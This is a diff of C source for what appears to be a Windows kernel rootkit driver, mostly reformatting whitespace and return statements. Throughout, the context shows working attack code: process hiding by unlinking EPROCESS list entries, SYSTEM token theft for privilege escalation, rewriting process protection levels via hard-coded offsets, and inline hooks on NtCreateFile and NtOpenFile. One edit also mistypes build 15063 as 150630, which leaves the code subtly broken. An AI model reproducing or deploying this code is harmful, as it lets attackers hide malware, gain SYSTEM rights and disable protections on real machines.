@@ -15,32 +15,40 @@ protection_level global_protection_levels = {
 
 void IRP_MJCreate()
 {
+
     DbgPrint("IRP_CREATED\n");
 
 }
 
 void IRP_MJClose()
 {
+
     DbgPrint("IRP_CLOSED");
 
 }
 
 DWORD UnprotectAllProcesses() {
-    PVOID process = NULL;
+    PVOID       process = NULL;
     PLIST_ENTRY plist;
-    NTSTATUS status = STATUS_UNSUCCESSFUL;
-    NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)4, (PEPROCESS*)&process);
+    NTSTATUS    status = STATUS_UNSUCCESSFUL;
+    NTSTATUS    ret;
+
+
+    ret = PsLookupProcessByProcessId((HANDLE)4, (PEPROCESS*)&process);
 
     if (!NT_SUCCESS(ret))
     {
+
         if (ret == STATUS_INVALID_PARAMETER)
         {
             DbgPrint("the process ID was not found.");
         }
+
         if (ret == STATUS_INVALID_CID)
         {
             DbgPrint("the specified client ID is not valid.");
         }
+
         status = ret;
     }
 
@@ -50,6 +58,7 @@ DWORD UnprotectAllProcesses() {
 
         while (plist->Flink != (PLIST_ENTRY)((char*)process + eoffsets.ActiveProcessLinks_offset))
         {
+
             DbgPrint("Blink: %p, Flink: %p\n", plist->Blink, plist->Flink);
 
             ULONG_PTR EProtectionLevel = (ULONG_PTR)plist->Flink - eoffsets.ActiveProcessLinks_offset + eoffsets.protection_offset;
@@ -58,6 +67,7 @@ DWORD UnprotectAllProcesses() {
 
             plist = plist->Flink;
         }
+
         status = STATUS_SUCCESS;
     }
     __finally {
@@ -72,10 +82,11 @@ HideProcess(
     int pid
 )
 {
-    PVOID process = NULL;
-    NTSTATUS status = STATUS_UNSUCCESSFUL;
+    PVOID       process      = NULL;
+    NTSTATUS    status       = STATUS_UNSUCCESSFUL;
+    BOOLEAN     lockAcquired = FALSE;
     PLIST_ENTRY plist;
-    BOOLEAN lockAcquired = FALSE;
+
 
     __try
     {
@@ -86,20 +97,24 @@ HideProcess(
 
             if (ret != STATUS_SUCCESS)
             {
+
                 if (ret == STATUS_INVALID_PARAMETER)
                 {
                     DbgPrint("The process ID was not found.");
                 }
+
                 if (ret == STATUS_INVALID_CID)
                 {
                     DbgPrint("The specified client ID is not valid.");
                 }
+
                 return (-1);
             }
 
             plist = (PLIST_ENTRY)((char*)process + eoffsets.ActiveProcessLinks_offset);
 
             ExAcquirePushLockExclusive(&pLock);
+
             lockAcquired = TRUE;
 
             if (plist->Flink == NULL || plist->Blink == NULL)
@@ -114,11 +129,11 @@ HideProcess(
                 __leave;
             }
 
-            plist->Flink->Blink = plist->Blink;
-            plist->Blink->Flink = plist->Flink;
+            plist->Flink->Blink     = plist->Blink;
+            plist->Blink->Flink     = plist->Flink;
 
-            plist->Flink = NULL;
-            plist->Blink = NULL;
+            plist->Flink            = NULL;
+            plist->Blink            = NULL;
 
             DbgPrint("Process '%wZ' is now hidden", PsGetProcessImageFileName(process));
 
@@ -142,52 +157,60 @@ HideProcess(
 
 
 DWORD InitializeOffsets(Phooklist hooklist) {
-    RTL_OSVERSIONINFOW pversion;
+    RTL_OSVERSIONINFOW  pversion;
 
     RtlGetVersion(&pversion);
 
     DbgPrint("Windows build %lu.", pversion.dwBuildNumber);
 
-    eoffsets.ActiveProcessLinks_offset = 0;
-    eoffsets.Token_offset = 0;
-    eoffsets.protection_offset = 0;
+    eoffsets.ActiveProcessLinks_offset  = 0;
+    eoffsets.Token_offset               = 0;
+    eoffsets.protection_offset          = 0;
 
     // Initialize offsets based on the Windows build number
-    if (pversion.dwBuildNumber >= 19041 && pversion.dwBuildNumber <= 19045) {
-        eoffsets.ActiveProcessLinks_offset = 0x448;
-        eoffsets.Token_offset = 0x4B8;
-        eoffsets.protection_offset = 0x87A;
+    if (pversion.dwBuildNumber >= 19041 && pversion.dwBuildNumber <= 19045)
+    {
+        eoffsets.ActiveProcessLinks_offset  = 0x448;
+        eoffsets.Token_offset               = 0x4B8;
+        eoffsets.protection_offset          = 0x87A;
     }
-    else if (pversion.dwBuildNumber == 18362 || pversion.dwBuildNumber == 17763) {
-        eoffsets.ActiveProcessLinks_offset = 0x2F0;
-        eoffsets.Token_offset = 0x360;
-        eoffsets.protection_offset = 0x6FA;
+
+    else if (pversion.dwBuildNumber == 18362 || pversion.dwBuildNumber == 17763)
+    {
+        eoffsets.ActiveProcessLinks_offset  = 0x2F0;
+        eoffsets.Token_offset               = 0x360;
+        eoffsets.protection_offset          = 0x6FA;
     }
-    else if (pversion.dwBuildNumber == 17134 || pversion.dwBuildNumber == 16299 || pversion.dwBuildNumber == 15063) {
+
+    else if (pversion.dwBuildNumber == 17134 || pversion.dwBuildNumber == 16299 || pversion.dwBuildNumber == 150630)
+    {
         eoffsets.ActiveProcessLinks_offset = 0x2E8;
-        eoffsets.Token_offset = 0x358;
-        eoffsets.protection_offset = 0x6CA;
+        eoffsets.Token_offset              = 0x358;
+        eoffsets.protection_offset         = 0x6CA;
     }
-    else if (pversion.dwBuildNumber == 22631 || pversion.dwBuildNumber == 22621 || pversion.dwBuildNumber == 22000) {
-        eoffsets.ActiveProcessLinks_offset = 0x448;
-        eoffsets.Token_offset = 0x4B8;
-        eoffsets.protection_offset = 0x87A;
+
+    else if (pversion.dwBuildNumber == 22631 || pversion.dwBuildNumber == 22621 || pversion.dwBuildNumber == 22000)
+    {
+        eoffsets.ActiveProcessLinks_offset  = 0x448;
+        eoffsets.Token_offset               = 0x4B8;
+        eoffsets.protection_offset          = 0x87A;
     }
+
     else if (pversion.dwBuildNumber == 26100)
     {
         eoffsets.ActiveProcessLinks_offset = 0x1d8;
-        eoffsets.Token_offset = 0x248;
-        eoffsets.protection_offset = 0x5fa;
+        eoffsets.Token_offset              = 0x248;
+        eoffsets.protection_offset         = 0x5fa;
     }
 
     if (eoffsets.ActiveProcessLinks_offset && eoffsets.Token_offset && eoffsets.protection_offset) {
         xHooklist.check_off = 0;
-        return STATUS_SUCCESS;
+        return ( STATUS_SUCCESS );
     }
 
-    DbgPrint("Unsupported Windows build %lu. Please open an issue in the repository with the given build number.", pversion.dwBuildNumber);
+    DbgPrint("Unsupported Windows build %lu. Please open an issue in the repository with the given build number.\n", pversion.dwBuildNumber);
     xHooklist.check_off = 1;
-    return STATUS_UNSUCCESSFUL;
+    return ( STATUS_UNSUCCESSFUL );
 }
 
 DWORD PrivilegeElevationForProcess(int pid)
@@ -205,17 +228,17 @@ DWORD PrivilegeElevationForProcess(int pid)
         {
             switch (status)
             {
-            case STATUS_INVALID_PARAMETER:
-                DbgPrint("The process ID was not found.\n");
-                break;
-            case STATUS_INVALID_CID:
-                DbgPrint("The specified client ID is not valid.\n");
-                break;
-            default:
-                DbgPrint("Unknown error occurred while looking up process ID.\n");
-                break;
-            }
-            return -1;
+                case STATUS_INVALID_PARAMETER:
+                    DbgPrint("The process ID was not found.\n");
+                    break;
+                case STATUS_INVALID_CID:
+                    DbgPrint("The specified client ID is not valid.\n");
+                    break;
+                default:
+                    DbgPrint("Unknown error occurred while looking up process ID.\n");
+                    break;
+                }
+            return ( - 1 );
         }
 
 
@@ -234,7 +257,7 @@ DWORD PrivilegeElevationForProcess(int pid)
                 DbgPrint("Unknown error occurred while looking up system process ID.\n");
                 break;
             }
-            return -1;
+            return ( -1 );
         }
 
         char* imageName = PsGetProcessImageFileName((PEPROCESS)process);
@@ -243,7 +266,7 @@ DWORD PrivilegeElevationForProcess(int pid)
         targetToken = PsReferencePrimaryToken(process);
         if (!targetToken)
         {
-            return -1;
+            return ( - 1 );
         }
 
         DbgPrint("%s token: %x\n", imageName, targetToken);
@@ -251,7 +274,7 @@ DWORD PrivilegeElevationForProcess(int pid)
         systemToken = PsReferencePrimaryToken(systemProcess);
         if (!systemToken)
         {
-            return -1;
+            return ( -1 );
         }
 
         DbgPrint("System token: %x\n", systemToken);
@@ -272,21 +295,24 @@ DWORD PrivilegeElevationForProcess(int pid)
         {
             ObDereferenceObject(systemProcess);
         }
+
         if (targetToken)
         {
             ObDereferenceObject(targetToken);
         }
+
         if (systemToken)
         {
             ObDereferenceObject(systemToken);
         }
+
         if (process)
         {
             ObDereferenceObject(process);
         }
     }
 
-    return STATUS_SUCCESS;
+    return ( STATUS_SUCCESS );
 }
 
 
@@ -295,28 +321,32 @@ ChangeProtectionLevel(
     PCR_SET_PROTECTION_LEVEL ProtectionLevel
 )
 {
-    PVOID process = NULL;
-    PPS_PROTECTION Protection;
+    PVOID           process     = NULL;
+    PPS_PROTECTION  Protection;
+
     NTSTATUS ret = PsLookupProcessByProcessId(ProtectionLevel->Process, &process);
 
     if (ret != STATUS_SUCCESS)
     {
+
         if (ret == STATUS_INVALID_PARAMETER)
         {
             DbgPrint("the process ID was not found.");
         }
+
         if (ret == STATUS_INVALID_CID)
         {
             DbgPrint("the specified client ID is not valid.");
         }
-        return (-1);
+
+        return ( -1 );
     }
 
     PPS_PROTECTION EProtectionLevel = (ULONG_PTR)process + eoffsets.protection_offset;
 
     *EProtectionLevel = ProtectionLevel->Protection;
 
-    return (0);
+    return ( 0 );
 }
 
 NTSTATUS InitializeStructure(Phooklist hooklist_s)
@@ -327,9 +357,9 @@ NTSTATUS InitializeStructure(Phooklist hooklist_s)
         return (-1);
 
     }
-    UNICODE_STRING NtCreateFile_STRING = RTL_CONSTANT_STRING(L"NtCreateFile");
+    UNICODE_STRING NtCreateFile_STRING  = RTL_CONSTANT_STRING(L"NtCreateFile");
 
-    UNICODE_STRING NtOpenFile_STRING = RTL_CONSTANT_STRING(L"NtOpenFile");
+    UNICODE_STRING NtOpenFile_STRING    = RTL_CONSTANT_STRING(L"NtOpenFile");
 
     RtlInitUnicodeString(&hooklist_s->decoyFile, L"\\SystemRoot\\System32\\ntoskrnl.exe");
 
@@ -344,11 +374,11 @@ NTSTATUS InitializeStructure(Phooklist hooklist_s)
 
     memset(hooklist_s->NtCreateFilePatch, 0x0, 12);
 
-    hooklist_s->NtCreateFilePatch[0] = 0x48;
-    hooklist_s->NtCreateFilePatch[1] = 0xb8;
+    hooklist_s->NtCreateFilePatch[0]    = 0x48;
+    hooklist_s->NtCreateFilePatch[1]    = 0xb8;
 
-    hooklist_s->NtCreateFilePatch[10] = 0xff;
-    hooklist_s->NtCreateFilePatch[11] = 0xe0;
+    hooklist_s->NtCreateFilePatch[10]   = 0xff;
+    hooklist_s->NtCreateFilePatch[11]   = 0xe0;
 
     DbgPrint("NtCreateFile resolved\n");
 
@@ -358,20 +388,18 @@ NTSTATUS InitializeStructure(Phooklist hooklist_s)
     {
         DbgPrint("NtOpenFile NOT resolved\n");
 
-        return (-1);
+        return ( -1 );
     }
 
     memset(hooklist_s->NtOpenFilePatch, 0x0, 12);
 
-    hooklist_s->NtOpenFilePatch[0] = 0x48;
-    hooklist_s->NtOpenFilePatch[1] = 0xb8;
+    hooklist_s->NtOpenFilePatch[0]      =   0x48;
+    hooklist_s->NtOpenFilePatch[1]      =   0xb8;
 
-    hooklist_s->NtOpenFilePatch[10] = 0xff;
-    hooklist_s->NtOpenFilePatch[11] = 0xe0;
+    hooklist_s->NtOpenFilePatch[10]     =   0xff;
+    hooklist_s->NtOpenFilePatch[11]     =   0xe0;
 
-    DbgPrint("NtOpenFile resolved\n");
-
-    DbgPrint("taking a copy before hook.. \n");
+    DbgPrint("NtOpenFile resolved, now taking a copy before hook.. \n");
 
     memcpy(hooklist_s->NtCreateFileOrigin, hooklist_s->NtCreateFileAddress, 12);
 
